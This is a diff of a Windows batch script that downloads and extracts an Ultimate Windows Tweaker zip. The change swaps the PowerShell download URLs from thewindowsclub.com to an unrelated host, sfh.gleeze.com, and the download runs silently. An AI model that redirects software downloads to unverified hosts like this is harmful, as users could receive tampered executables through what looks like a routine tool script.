@@ -7,10 +7,10 @@ echo Getting zip file..
 for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild 2^>nul') do set build=%%a
 if %build% GEQ 22000 (
 	set UWT=5
-    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://www.thewindowsclub.com/downloads/UWT5.zip -OutFile '%TEMP%\UWT.zip'"
+    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://sfh.gleeze.com/UWT5.zip -OutFile '%TEMP%\UWT.zip'"
 ) else (
 	set UWT=4
-    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://www.thewindowsclub.com/downloads/UWT4.zip -OutFile '%TEMP%\UWT.zip'"
+    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://sfh.gleeze.com/UWT4.zip -OutFile '%TEMP%\UWT.zip'"
 )
 echo Extracting zip..
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; Expand-Archive -Path '%TEMP%\UWT.zip' -DestinationPath '%USERPROFILE%\Desktop' -Force"
